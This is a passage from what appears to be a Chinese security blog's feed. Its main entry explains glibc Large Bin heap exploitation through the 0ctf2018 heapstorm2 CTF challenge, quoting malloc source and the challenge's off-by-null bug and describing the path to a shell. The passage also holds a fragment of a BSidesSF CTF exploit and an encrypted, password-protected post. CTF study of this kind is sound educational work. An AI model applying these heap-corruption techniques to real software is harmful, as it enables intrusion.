== '__main__': pwn() BSidesSF CTF 2019 straw_clutcher [2019.03.17]]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Learn Large Bin With 0ctf2018 Heapstorm2]]></title>
    <url>%2F2019%2F03%2F11%2FLearn-LargeBin-With-Heapstorm2%2F</url>
    <content type="text"><![CDATA[Large Bin基本结构Large Bin的每个Bin中的chunk的大小都属于同一范围，Large Bin的每个chunk位于两个双向链表中。相比较其它chunk，Large Bin中的chunk多出了fd_nextsize和bk_nextsize两个字段，分别指向前一个/后一个与当前chunk大小相邻的不同大小的第一个空闲块（不包括bin头指针）。 Put Unsorted Bin into Large Bin在malloc时，如果Unsorted Bin中的victim的大小无法满足申请所需且属于Large Bin，将会被置入Large Bin中。 123456789101112131415161718192021222324252627victim_index = largebin_index(size); // 计算bin数组下标bck = bin_at(av, victim_index); // 获取binfwd = bck-&gt;fd; // bin中第一个chunkif (fwd != bck) &#123; // 更新大小排序链表 // ... if (size &lt; bck-&gt;bk-&gt;size) &#123; // 如果大小小于bin中最小的chunk大小 fwd = bck; // bin bck = bck-&gt;bk; // 最后一个chunk // 在bin和bck中插入 victim-&gt;fd_nextsize = fwd-&gt;fd; // 写入fd_nextsize victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; // 写入bk_nextsize fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize; // 更新fwd-&gt;fd的bk_nextsize &#125; else &#123; // ... &#125;&#125; else &#123; // ...&#125;mark_bin(av, victim_index);// 更新普通链表victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim; 从源码中可以看出，Large Bin在更新链表的时候，没有freed chunk中的链表数据的进行任何的安全检查，利用这一点，可以向指定地址写入堆地址数据。利用对齐的特性向堆上写入0x56开头的堆地址，则可以在特定位置制造一个空闲的0x56大小的chunk。当申请0x48大小的chunk时（并触发unsorted bin一系列操作后），特定位置的chunk将会被取出。 0x55与0x5664位下，PIE和randomize_va_space对地址的影响： 0表示关闭地址空间随机化 1表示对mmap的基地址、栈地址和vdso地址随机化 2表示在1的基础上对堆地址随机化 当程序开启PIE且系统支持地址随机化时，堆地址的非零最高位会在0x55和0x56之间随机。这两个数字对于calloc()来说，只有0x56能够通过检查。 12assert (!mem || chunk_is_mmapped (mem2chunk (mem)) || av == arena_for_chunk (mem2chunk (mem))); 0ctf2018 heapstorm2明显的off-by-null漏洞。 12345input_string(chunk, size);remainder_space = size + chunk;*(_QWORD *)remainder_space = 'ROTSPAEH';*(_DWORD *)(remainder_space + 8) = 'II_M';*(_BYTE *)(remainder_space + 0xC) = 0; // off by null 利用off-by-null来制造堆块重叠，从而修改已释放的chunk的链表指针数据。通过将Unsorted Bin中的Large Chunk放入Large Bin的操作，向特定地址写入0x56开头的堆地址，使得再次申请chunk时，获得特定地址的chunk，从而改写关键数据以进一步getshell。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>0ctf</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debug Linux Kernel With QEMU/KVM]]></title>
    <url>%2F2019%2F02%2F13%2FDebug-Linux-Kernel-With-QEMU-KVM%2F</url>
    <content type="text"><![CDATA[Enter password to read. Incorrect Password! No content to display! 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